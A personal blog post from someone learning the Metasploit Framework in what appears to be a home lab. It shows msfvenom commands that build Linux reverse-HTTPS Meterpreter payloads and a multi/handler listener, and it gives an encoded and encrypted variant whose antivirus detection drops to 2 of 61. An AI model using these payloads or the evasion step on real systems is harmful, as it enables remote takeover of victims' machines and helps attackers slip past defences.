## Metasploit Framework
A little bit about Metasploit Framework, or for short msf, from what I've learned.

Just like Havoc Framework from my previous blog, you can create payloads based on attributes you give it. In msf case, it is done within the command line of a linux system. I just used Kali as it's preinstalled within it. Since I'm learning more about post-exploitation therefore I'm focusing on payloads and command & control (C2) aspects of msf. 

The Metasploit Framework uses msfvenom for making payloads and exploit/multi/handler in the msfconsole for listening and handling multiple sessions like a C2 server would for the most part. msfvenom has many payloads that can be created from their long list within the tool. 

For payloads, use "msfvenom -l all" for all options when using the tool or replace the word "all" with other options like payloads or encoders to narrow down the options when searching. Of course, there is always -h or --help to use to look up other argues and their uses.

For handling sessions during post-exploitation, use "exploit/multi/handler" after entering the msfconsole. In here, you set the parameters of the payload like the listening host and port so that the handler can catch the payload's execution from the victims machine.

### Little Tutorial
Example of making a stageless reverse https elf payload
```bash
msfvenom -a x86 --platform linux -p linux/x86/meterpreter_reverse_https LHOST=192.168.1.17 LPORT=9001 -f elf -o httpshell.elf  
```

VirusTotal scores this non-encoded payload with 31 of 61.

The settings of the exploit/multi/handler like payload, lhost, and lport match the msfvenom command from before therefore the listener knows what to look for.

The image below is the results you could expect from a mostly successful reverse HTTPs connection. It does contain a bunch of errors that are cut off but I'm looking into what they meant. Even with the errors I could use meterpreter on the victim's computer.

From there, I can interact with the meterpreter interface and execute commands internal or external towards the victims machine.

## Troubles while learning
I wanted to create a payload that can evade detection for Linux using msfvenom's encoder and encrypt features but it wasn't working when I executed the file on my linux victim machines and only resulted in a segmentation fault. If I recreated the payload encoded for windows and a .exe file if wouldn't have any issues.

```bash
msfvenom -a x86 --platform linux -p linux/x86/meterpreter_reverse_https LHOST=192.168.1.17 LPORT=9001 -e x86/shikata_ga_nai -i 10 --encrypt aes256 -f elf -o encodedpayload.elf
```

VirusTotal scores this encoded payload with 2 of 61.

I've be diving back into a while to find out how to overcome the segmentation fault error for linux when it doesn't occur for windows. I assume it is with how the payload is created, tt could be a simple fix or something complex.

## Conclusion
I like the GUI and interactability of Havoc Framework but its limitation of windows only levels it with Metasploit Framework in my eyes as a C2 server. With more practice with the Metasploit Framework, I can see this becoming number one compared to Havoc Framework. Understanding overcomes easy of accessability.
